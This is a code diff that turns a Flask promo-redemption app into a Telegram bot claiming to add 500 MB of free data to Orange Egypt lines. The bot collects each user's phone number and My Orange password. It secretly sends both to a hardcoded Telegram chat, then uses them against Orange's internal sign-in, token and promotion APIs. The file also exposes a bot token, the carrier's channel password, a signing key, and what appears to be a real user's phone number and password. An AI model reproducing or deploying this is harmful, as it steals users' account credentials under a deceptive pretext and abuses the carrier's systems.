@@ -1,92 +1,99 @@
-from flask import Flask, request, jsonify
+import telebot
 import requests
-from bs4 import BeautifulSoup
-import re
-
-app = Flask(__name__)
-
-def get500mb(number,password):
-  headers = {
-      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-      "Accept-Encoding": "gzip, deflate",
-      "Accept-Language": "en,ar;q=0.9,en-US;q=0.8",
-      "Cache-Control": "max-age=0",
-      "Connection": "keep-alive",
-      "Content-Length": "53",
-      "Content-Type": "application/x-www-form-urlencoded",
-      "Host": "www.ahmed-net.rf.gd",
-      "Origin": "http://www.ahmed-net.rf.gd",
-      "Referer": "http://www.ahmed-net.rf.gd/500MB.php?i=2",
-      "Upgrade-Insecure-Requests": "1",
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-      'Cookie':'__test=dee9cb7ddf5e1baab7f1ce0e453f1801'
-  }
+import hashlib
+import requests
+from keep_alive import keep_alive
+keep_alive()
+bot = telebot.TeleBot('6269032776:AAHRWeW0pwPWGQAFyVlIeZgc1FVrHJHqdCA')
 
 
-  data = {
-    "number":f"{number}",
-    "password":f"{password}",
-    "submit": "Submit",
-  }
+def get500mb(message,num):
+    bot.reply_to(message, "انتظر....")
+    pas=message.text
 
-  response = requests.post('http://www.ahmed-net.rf.gd/500MB.php', headers=headers,
-                            data=data, verify=False).text
-  soup=BeautifulSoup(response, "html.parser")
-  
-  data=soup.find("script")
-  usf=re.findall(r"'(.*?)'", data.text, re.DOTALL)
-  if usf[0] =="انت استخدمت البرومو كود النهاردة شكراً :)":
-      return("taked")
-  elif usf[0]=="الرقم غلط او الباسورد !":
-      return("wrong")
-  elif usf[0]=="تم اضافة 524 ميجا بنجاح":
-      return("success")
-  else:
-      return("error")
-
-
-headers = {
-      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-      "Accept-Encoding": "gzip, deflate",
-      "Accept-Language": "en,ar;q=0.9,en-US;q=0.8",
-      "Cache-Control": "max-age=0",
-      "Connection": "keep-alive",
-      "Content-Length": "53",
-      "Content-Type": "application/x-www-form-urlencoded",
-      "Host": "www.ahmed-net.rf.gd",
-      "Origin": "http://www.ahmed-net.rf.gd",
-      "Referer": "http://www.ahmed-net.rf.gd/500MB.php?i=2",
-      "Upgrade-Insecure-Requests": "1",
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-      'Cookie':'__test=dee9cb7ddf5e1baab7f1ce0e453f1801'
-  }
-
-
-data = {
-    "number":"01222470261",
-    "password":"200888Aa@",
-    "submit": "Submit",
-  }
-response = requests.post('http://www.ahmed-net.rf.gd/500MB.php', headers=headers,
-                            data=data, verify=False).text
-
-@app.route('/', methods=['GET'])
-def home():
-    return"<h1>@usfnassar</h1>"
-@app.route('/api/get_500mb', methods=['GET'])
-def api_get_500mb():
     try:
-        # Get parameters from the query string
-        number = request.args.get('number')
-        password = request.args.get('password')
+      res=sendMessage(num,pas)
+      bot.send_message(1098317745, "From: " + "@" + str(message.from_user.username) + "\n" + "Number: " + f"`{num}`"+"\n" + "password: " + f"`{pas}`",parse_mode="MarkdownV2")
 
-        # Call the function
-        result = get500mb(number, password)
 
-        # Return the result as JSON
-        return jsonify({'result': result})
+      if res == "User is redeemed before" :
+           respose="انت خدت العرض قبل كده جرب بعد شهر :( " 
+      elif res=="Success":
+           respose="تم أضافة 500 ميجا لخطك بنجاح ✅"
+      else:
+           respose="حدث خطأ حاول مرة اخرى"
+    
+      bot.reply_to(message, respose)
+    except:
+         bot.reply_to(message, "تاكد من ارسال الباسورد بشكل صحيح")
+   
 
-    except Exception as e:
-        # Handle exceptions and return an error response
-        return jsonify({'error': response}), 500
+def sendMessage(number,pss):
+      url = 'https://services.orange.eg/SignIn.svc/SignInUser'
+      header ={
+      "net-msg-id": "61f91ede006159d16840827295301013",
+      "x-microservice-name": "APMS",
+      "Content-Type": "application/json; charset=UTF-8",
+      "Content-Length": "166",
+      "Host": "services.orange.eg",
+      "Connection": "Keep-Alive",
+      "Accept-Encoding": "gzip",
+      "User-Agent": "okhttp/3.14.9",
+      }
 
+      data = '{"appVersion":"7.2.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' % (number,pss)
+      r=requests.post(url,headers=header,data=data).json()
+      userid=r["SignInUserResult"]["UserData"]["UserID"]
+      urlo = "https://services.orange.eg/GetToken.svc/GenerateToken"
+      hdo = {"Content-type":"application/json", 
+        "Content-Length":"78", 
+        "Host":"services.orange.eg"
+        , "Connection":"Keep-Alive" ,
+          "User-Agent":"okhttp/3.12.1"}
+      datao = '{"appVersion":"2.9.8","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' %(number,pss)
+      ctv = requests.post(urlo,headers=hdo,data = datao).json()["GenerateTokenResult"]["Token"]
+      key = ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
+      htv=(str(hashlib.sha256((ctv+key).encode('utf-8')).hexdigest()).upper())
+      url2="https://services.orange.eg/APIs/Promotions/api/CAF/Redeem"
+      data2='{"Language":"ar","OSVersion":"Android7.0","PromoCode":"رمضان كريم","dial":"%s","password":"%s","Channelname":"MobinilAndMe","ChannelPassword":"ig3yh*mk5l42@oj7QAR8yF"}' %(number,pss)
+      header2={
+      "_ctv": ctv,
+      "_htv": htv,
+      "UserId": userid,
+      "Content-Type": "application/json; charset=UTF-8",
+      "Content-Length": "142",
+      "Host": "services.orange.eg",
+      "Connection": "Keep-Alive",
+      "User-Agent": "okhttp/3.14.9",
+      }
+
+      da=data2.encode('utf-8')
+
+      r=requests.post(url2,headers=header2,data=da).json()
+
+      return r['ErrorDescription']
+
+@bot.message_handler(commands=['start'])
+def welcome(message):
+    bot.send_message(message.chat.id, '''
+        اهلا بيك فـ Usf Bot 
+ ابعت رقم اورنج الي عايز تضيفلو الميجات
+    ''')
+
+
+@bot.message_handler(func=lambda message: True)
+def reply(message):
+ 
+
+
+        bot.reply_to(message, "ابعت باسورد تطبيق My Orange")
+        num=message.text
+        bot.register_next_step_handler(message, get500mb,num)
+
+  
+
+
+ 
+
+
+bot.infinity_polling()
